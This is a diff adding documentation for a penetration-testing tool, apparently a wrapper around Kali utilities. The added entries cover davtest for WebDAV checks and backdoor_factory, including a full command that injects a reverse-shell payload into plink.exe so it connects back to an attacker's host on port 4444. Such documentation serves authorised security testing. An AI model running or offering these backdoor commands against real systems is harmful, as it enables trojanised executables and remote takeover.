@@ -3303,6 +3303,44 @@ hostname of the target system.</p>
 <p>For example: apache-users -h 192.168.1.202 -l
 /usr/share/wordlists/metasploit/unix_users.txt -p 80 -s 0 -e 403 -t
 10</p>
+<h2 id="backdoor_factory">backdoor_factory</h2>
+<p>Creates a backdoored executable using
+<code>backdoor-factory</code>.</p>
+<p>This function checks if <code>backdoor-factory</code> is installed,
+installs it if necessary, and then uses it to inject a reverse shell
+payload into a specified binary file. The binary is backdoored with a
+reverse shell payload that connects back to a specified host and
+port.</p>
+<p>:param line: The absolute path to the file that will be backdoored.
+If not provided, the user is prompted to enter the path.</p>
+<p>:returns: None</p>
+<p>Manual execution: To manually create a backdoored executable, use the
+following command: backdoor-factory -f <file_path> -H <lhost> -P <lport>
+-s reverse_shell_tcp_inline -J -a -c -l 128 -o <output_file></p>
+<p>Replace <code>&lt;file_path&gt;</code> with the path to the binary
+you want to backdoor, <code>&lt;lhost&gt;</code> with the IP address of
+the attacker’s machine, and <code>&lt;lport&gt;</code> with the port
+number to listen on. The <code>&lt;output_file&gt;</code> is the path
+where the backdoored binary will be saved.</p>
+<p>For example: backdoor-factory -f
+/usr/share/windows-binaries/plink.exe -H 192.168.1.202 -P 4444 -s
+reverse_shell_tcp_inline -J -a -c -l 128 -o
+sessions/backdoor_factory.exe</p>
+<h2 id="davtest">davtest</h2>
+<p>Tests WebDAV server configurations using <code>davtest</code>.</p>
+<p>This function checks if <code>davtest</code> is installed and
+installs it if necessary. It then runs <code>davtest</code> to perform a
+WebDAV server test against a specified URL or the default URL configured
+in <code>self.params</code>.</p>
+<p>:param line: The URL of the WebDAV server to test. If provided, it
+overrides the default URL. If not provided, the function uses the URL
+specified in <code>self.params["rhost"]</code>.</p>
+<p>:returns: None</p>
+<p>Manual execution: To manually test a WebDAV server, use the following
+command: davtest –url <url></p>
+<p>Replace <code>&lt;url&gt;</code> with the URL of the WebDAV server
+you want to test.</p>
+<p>For example: davtest –url http://example.com/webdav</p>
 <h2 id="find_tgts">find_tgts</h2>
 <p>No description available.</p>
 <h2 id="setup_handler">setup_handler</h2>
